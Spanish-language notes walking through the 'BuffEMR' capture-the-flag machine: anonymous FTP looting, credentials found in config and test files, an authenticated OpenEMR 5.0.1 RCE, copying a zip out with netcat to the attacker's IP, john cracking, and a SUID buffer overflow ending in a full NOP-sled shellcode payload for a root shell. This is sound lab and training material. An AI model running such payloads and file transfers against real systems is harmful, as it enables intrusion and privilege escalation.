# BuffEMR

Tags: [[_infoLeakage]],[[_webExploitation]],[[_bof]],[[_analysis]]

1.-
Primero la fase de reconocimiento.
La máquina responde, ttl=64, posible máquina Linux.

Procedo a crear mis directorios de trabajo.
Empiezo con la fase de NMAP.
Y con los puertos abiertos detectados, vamos a hacer un escaneo exhaustivo de los puertos.
Con el archivo de dicho escaneo, vamos a comenzar a ver vulnerabilidades, etc.

Está activo ftp, ssh, http
Antes que nada buscamos el codename:
Bionic, aunque luego lo vemos.

Veamos la web.
Es la página default de Apache

Podríamos:
+ Fuzzear por URIs (buscar archivos de Apache, como Logs).


2.-

No tengo credenciales para ftp, ssh
Pero entrando como anonymous en ftp, se puede.
Hay un directorio, un archivo y otro dir.

Con get, me descargo el README, hay muchos en el otro dir, es cuestión de husmear. Pero nos traemos todos mejor.
Como a parte hay directorios dentro de directorios, hacemos:
tree -L 2

Hay un comprimido curioso.
./contrib/zirmed.tar.gz

NOTA. No haber investigado qué es OPENEMR.
Aunque claro, no fuzzee.

En la web, ponemos /openemr y nos redirige a una página.
Donde pide credenciales.
Podemos probar contras por defecto. Pero vemos que no.

Así que volvamos a los recursos descargados y echemos un vistazo a todo.
Así que buscamos archivos que tengan de nombre config
find \-name \*conf\* 2>/dev/null

./Documentation/privileged_db/secure_sqlconf.php
Este archivo tiene cositas.
Dice de un puerto 3306, pero externamente no está abierto.
Dice de login y de pass, y de una dbase.
TENERLO EN MENTE, vamos a seguir buscando.

./sites/default/sqlconf.php
Uy este otro tiene cositas también.
Es de config de MySQL

Así que busquemos otros archivos.

Algunas credeciales a futuro:
stiltskin:adminPass


En el archivo 
./tests/test.accounts
Está.
admin:Monster123
Entramos a la página OPENEMR.

OPENEMR tiene la version v5.0.1
Buscamos en searchsploit
Hay uno que da justo a la versión.
RCE, sin y autenticado, yo ya estoy autenticado.

Le pasamos lo que nos pide, y es con python 2.7

PUES HASTA QUE TENGA EL PYTHON2.7 NO PODRÉ SEGUIR.
(Ya quedó según)

OK.
Primero fue isntalar pyenv, luego python2.7.16
Se asigna lo que nos pide en la zshrc
Luego se instala en el root también
Luego se instala las librerías necesarias, solo necesité instalar requests: 
pip install requests :    esto en el usuario normal, pero también en root.


NO SE HIZO
Y ya pude ejecutar el programa.
![[Pasted image 20240424032948.png]]
El 11 lo instalé yo con: apt-get install openjdk-11-jdk 
![[Pasted image 20240424033017.png]]
si le hago:
file /usr/bin/java :    tiene un enlace simbólico a el 17, pero quiero que sea el 11.

LO CAMBIAMOS. Cualquier problema tengo el 17, lo vuelo a hacer.
Habiendo cambiado, se cambia sin problemas.

Ahora en la ruta de bursuite, debemos cambiar para que tome la ruta del 11.
FINNOSEHIZO.

Una vez instalado en BurpSuite, continuamos

Viendo cómo se acontece por detrás, ganamos acceso a la máquina.
Hacemos el tratamiento de la tty.

Ahora toca husmear...

Hay un usuario, pero no puedo entrar.

Viendo los permisos SUID, está el pkexec, ping, 

Bueno antes que nada, vemos el codename:
bionic
Versión del kernel:
Linux 5.4.0-150-generic x86_64

Antes hay que ver en qué grupo estamos.
id
Privilegios:
sudo -l :    me pide contraseña, la proporciono y no hay nada.

Ok, yo me pondría a ver más cosas...
Podríamos checar las tareas que se están ejecutando por detrás.
De momento nada interesante en tareas cron.


Podríamos seguir enumerando el contenido de ftp.

No solo filtrar por archivos que contengan la palabra conf por ejemplo, si no también por palabras contenidas dentro de los archivos:
grep -r -iE "pass|key" :    se puede filtrar por las palabras que sean necesarias.
-iE porque estamos filtrando por varios campos.
Se puede compactar: grep -riE "pass|key"

En un archivo sql/key.sql, inserta en una tabla en campos, algunos valores.

Tenemos unas credenciales (la contraseña estaba en base64, también se debe probar):
pdfkey:san3ncrypt3d
La contraseña no es para el usuario buffemr

Hay que enumerar en la máquina...
En /var hay un comprimido .zip
Curioso, algunos archivos tiene de grupo:
whoopsie

¿Si descomprimimos el .zip nos pedirá una clave?

Primero hay que traerlo a mi máquina.
En mi máquina:
nc -nvlp 4343 > user.zip
En la máquina víctima:
nc 192.168.0.13 4343 < user.zip
Verificamos con md5sum y todo bien.

Hay que listar su contenido.
Hay un archivo.

Al extraer pide contraseña.
Probemos la que tenemos...

Primeramente juguemos con zip2jhon
Le pasamos el .zip, nos da un hash, y lo tratamos de romper offline.
Eso lo metemos en un fichero hash, y con john:
john -w:/usr/share/wordlists/rockyou.txt hash
Pero no resulta nada.

ERROR. No haber probado la contraseña pero en base64, bueno ya teniendo la original puedes pasarla a base64 tú xd.

Probamos la password en base64, y es esa.

En el fichero dice una contraseña y usuario, pero dice que solo por SSH, (aunque se puede pasar de wdata a buffemr)

Vale, proporcionando esa contraseña, al conectarme por ssh, me deja.

(NO QUITARÉ LA DE WWW-DATA, por si acaso).


Ahora toca seguir husmeando.
En downloads hay un comprimido .gz, no sé si es el mismo que vi en ftp

Estamos en algunos grupos.
Como estamos en adm, podemos listar logs del sistema.

También volvemos a buscar permisos SUID, y vemos uno nuevo al final.
/opt/dontexecute

Le hacemos un strings, pero nada interesante.

Lo ejecutamos, me pide un argumento, le metí una a e hizo algo, qué, quién sabe.

Si le meto varias 'A' seguidas me dice:
Segmentation fault (core dumped)

Se ve que es propenso a BufferOverFlow.
(Pasamos el límite del tamaño de Buffer asignado para ese argumento en dicho programa, haciendo un desbordamiento del Buffer).

Las AAA, están el el ESP (stack, la pila). Estando en el margen, todo bien.
Pero, si van incrementando las AAA, como hay otros registros, empiezo a sobrescribirlos.
Estos registros son EBP y RET(EIP), en ese orden.

Lo mejor es traerlo a mi máquina.
Checamos que no se haya visto manipulado el contenido.

Al programa le damos permisos de ejecución.

https://github.com/hugsy/gef
Instalo gef


Veo que tiene problemas con python3, lo pasamos a donde está el python2.7

Y ejecutamos el programa con gdb
gdb -q ./binary

Y a partir de aquí es darle...

El EIP contiene la dirección a donde va el flujo del programa para ejecutar las nuevas instrucciones, hago que el EIP apunte a las AAAA.

Entonces, como mis AAAA las pude poner ahí, el objetivo principal es averiguar cuál es el offset(cuántas A necesito meter para sobrescribir el EIP, y ahí poner lo que quiera).

Con esa cantidad de caracteres antes de los que se meten al EIP, antes que nada, hay que comprobarlo.

Vemos que sí, pero el flujo del programa lo redirigimos a esa dirección, pero sigue sin existir.

Checamos con checksec

Ahora, si quiero ejecutar un comando, en lugar de AAAA... meto un shellcode en un formato que se interprete a bajo nivel.
Me lo va a interpretar primero como cadena, (como checamos con checksec y ENX está deshabilitado), pero si logro que en el EIP hago que el flujo del programa vaya al inicio de la cadena que metimos antes (payload) me lo va a interpretar.


Primero vamos a meter en lugar de 512 AAAA, metemos nops, de No Operation Code, para que no me haga nada: <span style="color:#88c425">\x90</span>
Y luego un poco arriba meto el shellcode.
Para que lo desplacemos hasta donde queremos que haga algo.

OK, antes de ejecutar el shellcode, tenemos que ver de cuántos bytes es el shellcode, para eso restarle al offset.
512 - 33

El resultado son los nops y después el shellcode, vemos que sigue valiendo BBBB

Checamos con: x/300wx $esp
Y usamos una dirección.
Le damos la vuelta. En pares de 2.

$(python -c 'print "\x90"*479 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\xb0\xd5\xff\xff"')

Esto lo ejecutamos fuera, y obtenemos la bash como root.

Nota. Veamos [[GDB]].